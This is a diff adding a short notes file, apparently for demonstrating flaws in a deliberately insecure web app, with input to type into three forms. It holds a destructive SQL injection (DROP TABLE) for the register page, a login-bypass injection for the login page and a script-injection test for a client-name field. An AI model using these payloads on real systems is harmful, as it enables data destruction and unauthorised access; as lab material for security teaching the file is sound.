@@ -1,0 +1,10 @@
+For register page(put in the password section):
+123'); DROP TABLE usersunsecure; --
+
+
+For login page(put in the password section):
+' OR '1'='1
+
+
+For add clients page(put in first name):
+<script>alert("you are hacked!")</script>
